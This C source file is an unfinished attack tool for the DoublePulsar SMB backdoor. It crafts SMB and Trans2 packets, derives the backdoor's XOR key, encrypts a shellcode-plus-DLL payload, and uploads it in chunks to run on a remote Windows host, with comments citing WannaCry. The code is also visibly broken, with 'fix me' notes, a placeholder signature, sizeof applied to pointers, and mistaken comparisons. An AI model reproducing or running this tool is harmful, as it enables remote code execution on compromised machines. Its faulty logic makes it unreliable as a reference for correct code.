#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char TreeConnect_AndX_Request[] =
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";
unsigned char ModifiedTreeConnectRequest[sizeof(TreeConnect_AndX_Request)+20];

unsigned char trans2_request[] = 
"\x00\x19\xBB\x4F\x4C\xD8\x00\x25\xB3\xF5\xFA\x74\x08\x00\x45\x00"
"\x00\x7A\x0A\x8F\x40\x00\x80\x06\x85\x7E\xC0\xA8\x74\x95\xC0\xA8"
"\x74\x8A\xC6\x95\x01\xBD\x72\xF7\x70\x1F\xAC\x32\x3A\xF3\x50\x18"
"\x00\xFF\xA4\xFB\x00\x00\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00"
"\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08"
"\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01"
"\x34\xEE\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01\x00\x0E"
"\x00\x0D\x00\x00\x00\x00";

typedef struct {
	uint16 SmbMessageType; //0x00
	uint16 SmbMessageLength; 
	uint8 ProtocolHeader[4]; //"\xffSMB"
	uint8 SmbCommand; 
	uint32 NtStatus; //0x00000000
	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16 flags2;  //0xC007
	uint16 ProcessIDHigh; //0x00
	uint8 signature[8]; //0x00000000000
	uint16 reserved; //0x0000
	uint16 TreeId; 
	uint16 ProccessID; //0xfeff
	uint16 UserID; 
	uint16 multipleID;

	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout;   // 0x25 0x89 0x1a 0x00
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount; //4096
	uint16 DataOffset; //78
	uint8 SetupCount; 
	uint8 reserved3;
	uint16 Function; //0x0e00 also known as Subcommand in Wireshark
	uint16 ByteCount; //4109 or 0x0d 0x10
	uint8 padding;
	//uint8 TransactionName[14]; 
	//uint16 padding2;
	char SESSION_DATA_PARAMETERS[12]; //Wannacry uses 12 as the size
	char payload[4096];
} SMB_COM_TRANSACTION2_STRUCT;

/*
	Sample SESSION_SETUP parameter values:
	42 30 80 57 42 d0 d0 57 42 d0 e6 57

	SMB_COM_TRANSACTION2_STRUCT trans2;
	trans2.SmbCommand = 0x32;
	trans2.Flags1 = 0x18;
	trans2.Flags2 = 0xc007;
	trans2.WordCount = 14 + setup_count; 
	trans2.TreeID = treeid; //extracted earlier
	trans2.multipleid  = 41;
	trans2.ParamCountTotal = param.length;
	trans2.DataCountTotal = bodyCount; //Count of the whole data being sent
	trans2.ParamCountMax = 1;
	trans2.DataCountMax = 0;
	trans2.ParamCount = param.length;
	trans2.ParamOffset = param_offset;
	trans2.DataCount = lpbdata.dwSize;
	trans2.DataOffset = data_offset;
	trans2.SetupCount = setup_count;
	trans2.SetupData = setup_data;
	trans2.timeout = 0x25891a00;
	trans2.payload = lpbdata.dwData;

	send(socket, (char*)trans2, sizeof(trans2), 0);

*/

/*
//0x32
typedef struct
{
    unsigned char wordcount;
    struct
    {
        unsigned short TotalParameterCount;
        unsigned short TotalDataCount;
        unsigned short MaxParameterCount;
        unsigned short MaxDataCount;
        unsigned char  MaxSetupCount;
        unsigned char  Reserved1;
        unsigned short Flags;
        unsigned int  Timeout;
        unsigned short Reserved2;
        unsigned short ParameterCount;
        unsigned short ParameterOffset;
        unsigned short DataCount;
        unsigned short DataOffset;
        unsigned char  SetupCount;
        unsigned char  Reserved3;
        unsigned short Setup[1];
    }words;
}rqpara32;

typedef struct
{
    unsigned char wordcount;
    struct
    {
        unsigned short TotalParameterCount;
        unsigned short TotalDataCount;
        unsigned short Reserved1;
        unsigned short ParameterCount;
        unsigned short ParameterOffset;
        unsigned short ParameterDisplacement;
        unsigned short DataCount;
        unsigned short DataOffset;
        unsigned short DataDisplacement;
        unsigned char SetupCount;
        unsigned char Reserved2;
    }words;
}rppara32;

typedef struct
{
    unsigned short bytecount;
    struct
    {
        char s[4000];
    }bytes;
}rpdata32;
*/

//globals
HANDLE hProcHeap;
unsigned char recvbuff[2048];

typedef struct {
	LPBYTE lpbData;
	DWORD dwDataSize;
} BUFFER_WITH_SIZE;

typedef BUFFER_WITH_SIZE* PBUFFER_WITH_SIZE;
#define SHELLC_DLL_SIZE_OFFSET 0xf82
#define SHELLC_ORDINAL_OFFSET 0xf86

void read_file(LPCSTR filename, PBUFFER_WITH_SIZE pBws)
{
	HANDLE hFile;
	LONGLONG llFileSize;
	LARGE_INTEGER liFileSize;
	DWORD dwBytesRead;
	DWORD dwTotalBytesRead;
	LPBYTE lpFileData;
	BOOL bResult;

	hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Could not open file %s\n", filename);
		exit(1);
	}

	bResult = GetFileSizeEx(hFile, &liFileSize);
	if (!bResult)
	{
		printf("Error getting size of file %s\n", filename);
		exit(1);
	}
	llFileSize = liFileSize.QuadPart;

	lpFileData = *(LPBYTE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, llFileSize);
	if (lpFileData == NULL)
	{
		printf("Error allocating memory\n");
		exit(1);
	}

	dwTotalBytesRead = 0;
	do
	{
		bResult = ReadFile(hFile, lpFileData + dwTotalBytesRead,
			llFileSize - dwTotalBytesRead, &dwBytesRead, NULL);
		dwTotalBytesRead += dwBytesRead;
	} while (!(bResult && dwBytesRead == 0) || !bResult);
	if (!bResult)
	{
		printf("Error reading file %s\n", filename);
		exit(1);
	}

	CloseHandle(hFile);

	pBws->lpbData = lpFileData;
	pBws->dwDataSize = llFileSize;
}

void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBUFFER_WITH_SIZE pBws)
{
	BUFFER_WITH_SIZE shellcode;
	BUFFER_WITH_SIZE dll;
	DWORD dwPayloadSize;
	LPBYTE lpbPayload;

	read_file(shellcode_file, &shellcode);
	read_file(dll_file, &dll);

	dwPayloadSize = shellcode.dwDataSize + dll.dwDataSize;

	lpbPayload = *(LPBYTE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, dwPayloadSize);
	if (lpbPayload == NULL)
	{
		printf("Error allocating memory\n");
		exit(1);
	}

	// Edit shellcode to include ordinal and shellcode size
	memcpy_s(shellcode.lpbData + SHELLC_DLL_SIZE_OFFSET,
		shellcode.dwDataSize - SHELLC_DLL_SIZE_OFFSET, &(dll.dwDataSize), sizeof(dwPayloadSize));
	memcpy_s(shellcode.lpbData + SHELLC_ORDINAL_OFFSET,
		shellcode.dwDataSize - SHELLC_ORDINAL_OFFSET, &ordinal, sizeof(ordinal));

	// Put it all together, shellcode + DLL
	memcpy_s(lpbPayload, dwPayloadSize, shellcode.lpbData, shellcode.dwDataSize);
	memcpy_s(lpbPayload + shellcode.dwDataSize, dwPayloadSize - shellcode.dwDataSize,
		dll.lpbData, dll.dwDataSize);
	if (shellcode.lpbData != NULL)
		HeapFree(hProcHeap, 0, shellcode.lpbData);
	if (dll.lpbData != NULL)
		HeapFree(hProcHeap, 0, dll.lpbData);

	pBws->lpbData = lpbPayload;
	pBws->dwDataSize = dwPayloadSize;
}

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
}

int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	if (!WSAStartup(MAKEWORD(2, 2), &ws))
	{
		printf("couldn't initialize Windows Sockets!");
		ExitProcess(0);
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	printf("Connecting %s\n", argv[1]);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid
	
	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	int i;
	char hostipc[40];
	char hostipc2[40*2];
	char smblen;
	char unclen;
	sprintf((char *)hostipc,"\\\\%s\\ipc$", argv[1]);
	for (i=0; i<40; i++)
	{
		hostipc2[i*2] = hostipc[i];
		hostipc2[i*2+1] = 0;
	}
	memcpy(ModifiedTreeConnectRequest, TreeConnect_AndX_Request, sizeof(TreeConnect_AndX_Request)-1);
	memcpy(ModifiedTreeConnectRequest+48, &hostipc2[0], strlen(hostipc)*2);
	memcpy(ModifiedTreeConnectRequest+47+strlen(hostipc)*2, TreeConnect_AndX_Request+87, 9);
	smblen = 52+(char)strlen(hostipc)*2;
	memcpy(ModifiedTreeConnectRequest+3, &smblen, 1);
	unclen = 9 + (char)strlen(hostipc)*2;
	memcpy(ModifiedTreeConnectRequest+45, &unclen, 1);
	//update UserID in modified TreeConnect Request
	memcpy(ModifiedTreeConnectRequest + 0x20, (char*)&userid, 2); //update userid
		
	//send TreeConnect request packet
	printf("sending TreeConnect Request!\n");
	send(sock, (char*)ModifiedTreeConnectRequest, sizeof(ModifiedTreeConnectRequest) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	WORD processid, multiplexid;
	//obtain ProcessID = smb_response[30][31]
	//obtain Multiplex ID = smb_response[34][35]
	processid = *(WORD*)(recvbuff + 30);
	multiplexid = *(WORD*)(recvbuff + 34);

	//Update treeID, Process ID, UserID, Multiplex ID
	//update Multiplex ID to 65
	memcpy(trans2_request + 28, (char*)&treeid, 2);
	memcpy(trans2_request + 30, (char*)&processid, 2);
	memcpy(trans2_request + 32, (char*)&userid, 2);
	//memcpy(trans2_request + 34, (char*)&multiplexid, 2);
	trans2_request[34] = '\x41'; //update Multiplex ID to 41
	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x51 or 81
	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//Not Done!  Fix me!
	//extract SMB Signature Key from the Trans2 SESSION_SETUP Response
	unsigned int smb_signature[8];
	//OR
	//memcpy(signature, (unsigned int*)&recvbuff + 18, 8);
	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 2);
	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 2);
	memcpy(smb_signature + 4, (unsigned int*)&recvbuff + 22, 2);
	memcpy(smb_signature + 6, (unsigned int*)&recvbuff + 24, 2);
	
	/* untested 
	unsigned int smb_signature[3];
	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 1);
	memcpy(smb_signature + 1, (unsigned int*)&recvbuff + 19, 1);
	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 1);
	memcpy(smb_signature + 3, (unsigned int*)&recvbuff + 21, 1);
	//get Architecture of remote computer via Doublepulsar response
	BOOL is64bit;
	if(recvbuff[22] = 1)
	{
		is64bit = TRUE;
		printf("Arch is 64 bit!\n");
	}
	*/
	
	//Example SMB signature
	unsigned int signature[] = { 0x3a, 0x10, 0xe0, 0x36 };
	//Generate the doublepulsar XOR key from the SMB trans2 response signature
	//This XOR key will be used to encrypt the payload buffer
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
	printf("Calculated XOR KEY:  0x%x", XorKey);

	BUFFER_WITH_SIZE payload;
	LPCSTR shellcode_file;
	LPCSTR dll_file;
	DWORD ordinal;
	shellcode_file = "userland_shellcode.bin";
	dll_file = "payload.dll";
	ordinal = 1;
	//construct payload 
	construct_payload(shellcode_file, dll_file, ordinal, &payload);
		
	//Xor the data buffer with the calculated key
	int len = 0;
	len = sizeof(payload.lpbData);
	unsigned char *encrypted;
	encrypted = (unsigned char*)malloc(len+1);
	for(i=0;i<len;i++)
	{
		encrypted[i] = payload.lpbData[i]^XorKey;
        }

	//build packet buffer with 4178 bytes in length
	//82 bytes for the Trans2 Session Setup packet header
	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
	//Then fill the packet with 0x00s and XOR it with the calculated key
	char *big_packet = (unsigned char*)malloc(4178+1);
	memset(big_packet, 0x00, 4178);
	int bp;
	for(bp=0;bp<4178;bp++)
	{
		big_packet[i] = big_packet[i]^XorKey;
        }

	//Copy Trans2 Information
	//Update the values (TreeID, UserID, Multiplex, ProcessID) for the SMB packet
	//update the timeout to run the DoublePulsar commands
	//Copy the encrypted shellcode & DLL in 4096 byte chunks
	//reads the response from the SMB response packet to determine if status is good or bad
	int ctx;
	int encrypted_buffer_len = sizeof(encrypted);
	int bytesLeft = encrypted_buffer_len;
	printf("Uploading file...%d bytes to send\n", encrypted_buffer_len);
	int numberofpackets = encrypted_buffer_len / 4096;
	int iterations = encrypted_buffer_len % 4096;
	printf("will send %d packets of data\n ", numberofpackets);
	printf("%d as a remainder\n", iterations);
	
	for (ctx = 0; ctx < encrypted_buffer_len;)
	{
		if (bytesLeft < 4096)
		{
			//copy trans2 header to big packet
			memcpy(big_packet, trans2_request, sizeof(trans2_request));

			//update TreeId, UserID, ProcessID & MultiplexID in packet
			memcpy(big_packet + 28, (char*)&treeid, 2);
			memcpy(big_packet + 30, (char*)&processid, 2);
			memcpy(big_packet + 32, (char*)&userid, 2);
			big_packet[34] = '\x41';

			//update Timeout for RunShellcode
			//25 89 1a 00 is the opcode for RunShellcode & DLL
			big_packet[49] = '\x25';
			big_packet[50] = '\x89';
			big_packet[51] = '\x1a';
			big_packet[52] = '\x00';
			
			//since this packet is smaller than the rest
			//Generate new memory location with the size of: bytesLeft+32+34+12
			//the total SMB length has to be changed because this packet is smaller than the rest
			smblen = bytesLeft+32+34+12; //BytesLeft + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
			memcpy(big_packet+3, &smblen, 1);
			
			printf("Bytes left is less than 4096!...Generating smaller packet!\n");
			memcpy(big_packet +  sizeof(trans2_request), (unsigned char*)encrypted + ctx, bytesLeft);
			//send(s, (char*)Trans2SESSION, 4178, 0);
			//send(s, &buf, 4178, 0);
			send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
			{
				printf("All data sent and got good response from DoublePulsar!\n");
			}
			break;
		}
		memcpy(big_packet, trans2_request, sizeof(trans2_request));

		//update TreeId, UserID, ProcessID & MultiplexID in packet
		memcpy(big_packet + 28, (char*)&treeid, 2);
		memcpy(big_packet + 30, (char*)&processid, 2);
		memcpy(big_packet + 32, (char*)&userid, 2);
		//memcpy(big_packet + 34, (char*)&multiplexid, 2);
		//update multiplex id to 41
		//if doublepulsar is successful, it will increment by 10
		//if x51 is returned then success it ran!
		big_packet[34] = '\x41';

		//update Timeout for RunShellcode
		//25 89 1a 00 is the opcode for RunShellcode & DLL
		big_packet[49] = '\x25';
		big_packet[50] = '\x89';
		big_packet[51] = '\x1a';
		big_packet[52] = '\x00';
		
		//fix me
		//copy 4096 bytes at a time from the XOR encrypted buffer
		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, 4096);

		//FIX ME
		//fix data len values
		//Trans2.Session_Data_Length = sizeof(encrypted);
		
		//FIX ME
		//fix SMB data length in SMB header
		smblen = 4096+32+34+12; //4096 + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
		memcpy(big_packet+3, &smblen, 1);

		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
		send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
		
		//subtract BytesToRead by how much we sent
		bytesLeft -= 4096;
		//compare the NT_STATUS response to 0xC0000002 ( STATUS_NOT_IMPLEMENTED )
		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
		{
			printf("Data sent and got good response from DoublePulsar!\n");
		}
		else {
			printf("Not good!  Doesn't seem to be working!  DoublePulsar error! Exiting!\n");
			goto cleanup;
		}
	
		//increment CTX pointer by 4096, so the correct bytes next loop will be copied
		ctx += 4096;
	}

	//command received successfully!
	if (recvbuff[34] = 0x51)
	{
		printf("MultiplexID = x51 or 81...DoublePulsar ran successfully!\n");
	}

cleanup:
	//free data for payload generation
	if (payload.lpbData != NULL)
	{
		HeapFree(hProcHeap, 0, payload.lpbData);
	}

	//free the memory for the XOR buffer
	free(encrypted);

	//free the 4178 packet
	free(big_packet);

	closesocket(sock);
	WSACleanup();
	return 0;
}
